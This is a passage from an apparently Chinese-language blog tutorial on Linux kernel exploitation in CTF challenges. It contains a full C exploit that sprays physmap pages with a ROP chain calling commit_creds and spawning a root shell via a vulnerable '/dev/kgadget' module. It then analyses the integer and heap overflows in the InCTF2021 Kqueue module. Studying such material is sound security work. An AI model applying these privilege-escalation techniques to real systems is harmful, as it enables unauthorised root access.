class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[idx++] = pop_rdi_ret;<br>rop[idx++] = init_cred;<br>rop[idx++] = commit_creds;<br>rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br></code></pre></td></tr></table></figure><p>我们的ROP链都是在用户空间编写的，能够映射到内核空间的某个地方，但是要执行这些ROP还需要我们将栈引导到这些内核映射区中。可以用形如<code>add rsp, offest ; ret</code>这样的gadget来使栈指针指向pt_regs结构，我们可以在pt_regs上构造rop链，但是本题限制严格只能使用r9，r8两个寄存器的值，所以没办法，可以再一次栈迁移到我们的rop链。</p><p>由于不知道指向我们申请内存的偏移为多少，可以用slide code，一直滑到我们的提权代码</p><p>我们可以用形如<code>add rsp, offest ; ret</code>或者<code>ret</code>这种gadget当作滑板，一直滑到提权代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>.....<br>ret<br>ret<br>.....<br>pop_rdi_ret;<br>init_cred;<br>.....<br></code></pre></td></tr></table></figure><h5 id="3-梳理流程">3.梳理流程</h5><p>我们rdx控制为一个线性映射区的地址，当触发时，执行这个线性映射区的代码，因为我们喷射了很多填满payload的页，所以很大概率是执行填满payload的页里的<code>add rsp, offest ; ret</code>，栈迁移到内核寄存器pt_regs结构里的r9，执行<code>pop rsp;ret</code>，我们r8控制为这个线性映射区的地址，第二次栈迁移到这个线性映射区了，执行<code>add rsp, offest ; ret</code>当做滑板，滑到<code>ret</code>，最后滑到我们的提权链</p><h4 id="0x03exp">0x03exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">size_t</span> page_size=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds=<span class="hljs-number">0xffffffff810c92e0</span>;<span class="hljs-comment">//by set init root get or ida vmlinux</span><br><span class="hljs-type">size_t</span> prepare_kernel_cred=<span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">size_t</span> init_cred=<span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span>(;idx&lt;(page_size/<span class="hljs-number">8</span><span class="hljs-number">-0x30</span>);idx++)<br>        rop[idx]=<span class="hljs-number">0xffffffff810737fe</span>; <span class="hljs-comment">//add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</span><br>            <span class="hljs-comment">//more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        <span class="hljs-comment">//rop[idx] = 0xffffffff810001fc ;//ret</span><br>        rop[idx]=<span class="hljs-number">0xffffffff8108c6f1</span>;<br>    <br><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>&#125;<br><br><span class="hljs-type">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> try_hit=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    fd =open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>,O_RDWR);<span class="hljs-comment">//read &amp; write of file</span><br>    <span class="hljs-keyword">if</span> (fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open /dev/kgadget error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    page_size=sysconf(_SC_PAGESIZE);<span class="hljs-comment">//Get the current system page size</span><br>    <span class="hljs-comment">//construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    rop_chain(physmap_spray_arr[<span class="hljs-number">0</span>]); <br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">15000</span>;i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X]oom,error exit&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br>    <br>    try_hit=<span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    <span class="hljs-comment">//ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now trigger...&quot;</span>);<br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0xffffffff811483d0;&quot;</span>   <span class="hljs-comment">// pop rsp;ret stack migration again</span><br>    <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    ); <br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="05-heap-overflow">05.heap overflow</h2><h3 id="InCTF2021-Kqueue">InCTF2021 - Kqueue</h3><p>解压打包要在root下进行，不然可能遇到各种奇怪的权限问题</p><h4 id="0x01程序分析-3">0x01程序分析</h4><p>只装载了这个LKM，按套路漏洞就在这里面</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684499471325.png" alt="1"></p><h5 id="1-保护">1.保护</h5><p>开启了kaslr，没开启smep/smap,KPTI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">stty sane<br>exec qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel &quot;bzImage&quot; \<br>    -append &quot;console=ttyS0 oops=panic panic=-1 pti=off kaslr quiet&quot; \<br>    -monitor /dev/null \<br>    -initrd &quot;./rootfs.cpio&quot; \<br>    -s<br></code></pre></td></tr></table></figure><h5 id="2-源码">2.源码</h5><p>程序实现了在内核态的队列管理，数据结构学的稀烂，看麻了</p><h6 id="一-结构体">一.结构体</h6><p>定义了管理结构queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> data_size; <span class="hljs-comment">//每个queue_entry成员的大小</span><br>  <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">//一个队列总大小</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<span class="hljs-comment">//queue_entry的最大数量</span><br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><p>kqueues数组，也就是最多5个队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure><p>定义成员结构queue_entry</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">queue_entry *kqueue_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> idx;<span class="hljs-comment">//entry的下标</span><br>  <span class="hljs-type">char</span> *data;<span class="hljs-comment">//当前entry维护的数据</span><br>  queue_entry *next; <span class="hljs-comment">//next指针,就是链表嘛</span><br>&#125;;<br></code></pre></td></tr></table></figure><h6 id="二-create-kqueue">二.create_kqueue</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><span class="hljs-comment">//队列数量不能大于5</span><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><span class="hljs-comment">//queue_entry最大数量不能为0</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><span class="hljs-comment">//queue_entry成员大小不能大于0x20</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br>    queue_entry *kqueue_entry;<br><span class="hljs-comment">//下面两个检查就是判断有无整数溢出</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><span class="hljs-comment">//一个队列总大小不能过0x10000</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br> <span class="hljs-comment">//所有检查完毕，开始分配内存</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><span class="hljs-comment">//遍历查找数组里有无空余的</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//这里循环完j=5，不会执行if语句，我们能越界多分配一个队列</span><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序用gcc内置函数<code>__builtin_umulll_overflow</code>检测乘法溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>检测<code>sizeof(queue_entry)</code>与<code>(request.max_entries+1)</code>相乘是否溢出,</p><p>但是<code>request.max_entries</code>本身没有溢出检测</p><p>在request_t结构的定义里它是32位无符号整型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<br>  <span class="hljs-type">uint16_t</span> data_size;<br>  <span class="hljs-type">uint16_t</span> entry_idx;<br>  <span class="hljs-type">uint16_t</span> queue_idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure><p><strong>存在整型溢出漏洞</strong>，如果我们输入一个极大值<code>0xffffffff</code>，那么加1后发生溢出，发生溢出变为0，从而通过了乘法检测，</p><p>所以<code>request.max_entries</code>可以是0xffffffff这个极大值</p><p>下一个检测<code>__builtin_saddll_overflow</code>因为space=0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure><p>所以queue_size=sizeof(queue)</p><p>值得一题的是因为<code>request.max_entries+1=0</code>，所以也没有进入循环，所以没有分配任何一个queue_entry成员</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)</span></span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="三-save-kqueue-entries">三.save_kqueue_entries</h6><p>这里存在<strong>堆溢出漏洞</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br><span class="hljs-comment">//各种检查</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><span class="hljs-comment">//为需要保存的队列分配内存，由于我们的构造，这里只分配给new_queue一个小内存</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br><span class="hljs-comment">//拷贝到new_queue内存queue-&gt;data数据，长度是我们另定的request.data_size，所以存在溢出</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span 